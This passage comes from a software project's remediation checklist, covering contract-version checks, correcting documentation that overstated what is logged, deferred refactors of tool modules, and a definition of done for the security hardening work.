      `validate_revision_argument` first, so the second layer is never reached
- [ ] `patch_file`'s `expected_sha256` pass-through (`tools/filesystem.py:255-257`)
- [ ] Tracked cache-volume removal (`conftest.py:123-125`)
- [ ] `git_push` success-record `refspec` / `remote_protection_status` (R2)

### R25 — The contract check is order-insensitive and monotonic
**Satisfies:** RR-028

- [ ] Sort the tool array by name before diffing (`jq -S` sorts object keys only,
      so a pure reordering falsely demands a bump)
- [ ] Reject a non-increasing `contract_version`
- [ ] Widen `docs/TOOLS.md`'s drift-check pattern beyond `[a-z_]+` so a future
      tool name with a digit does not produce a spurious failure

---

## Phase 7 — Documentation truth

### R26 — Apply the `REMEDIATION_SPEC.md` §16 amendments
**Satisfies:** RR-032, RR-033

- [ ] `SPEC.md` §24 — state that only container lifecycle, job reconciliation,
      ssh-agent lifecycle, and policy denials are logged; list the rest as
      unimplemented
- [ ] `SPEC.md` §20.2, §18.7, §26 — per the §16 table
- [ ] `HARDENING_SPEC.md` HR-002, HR-014, HR-016, HR-018, HR-026 — per the §16 table
- [ ] `HARDENING_TODO.md` H35 table — remove the S31/H32 mis-citation; restate
      the S9/S10 "fails open" row as an error-classification gap
- [ ] `TODO.md` S15 correction — it asserts the `pid=None` race does not exist; it does
- [ ] Bump `SPEC.md` to 0.3 and note in `HARDENING_SPEC.md` §2 which points this
      document governed and have now returned

**Defect (verified).** H34's §24 amendment states a file write, a file delete,
and a job cancellation "are logged operationally (§13, HR-031)". Neither
`tools/filesystem.py`, `filesystem/service.py`, nor `tools/execution.py` contains
a logger at all — only container lifecycle is logged. Three of four claims are
false, in the direction of overclaiming, introduced by the task whose purpose was
eliminating documentation overclaims.

H35's table carried an S31 row citing H32 for pid-exhaustion detection (H32 never
addressed it) and an S9/S10 row calling rule 3 "fails open" when the request is in
fact still refused, just with a less specific code. Both were transcribed rather
than re-run.

---

## Deferred

### H37 — §12.1 rule 3 classification gap
Already tracked in `docs/HARDENING_TODO.md`'s Deferred section. Confirmed not an
access-control bypass — only a less specific error code. Fix scoped there.

### R27 — Extract tool bodies from the `register()` closures
Not scheduled. `tools/git.py`'s `register()` is 853 lines and `git_push_tool`
alone is 306; tool bodies cannot be unit-tested without constructing a server,
which is what forced H32's `run_setup_steps` extraction. Worth doing, but it is a
large mechanical refactor touching every tool module and would collide with every
task above. Revisit once Phases 0–7 are closed.

---

## Definition of done

Both Critical requirements are closed and covered by RAT-001..RAT-004; every
`SHALL` in `docs/REMEDIATION_SPEC.md` is implemented or explicitly deferred with a
reason; every test in RR-026's table exercises its adversarial input; every fix in
RR-027 fails the suite when reverted; §16's amendments are applied; the full suite
passes with no Docker-dependent test skipped; a suite run leaves foreign Docker
state untouched; and no statement in any document overstates what the code does.
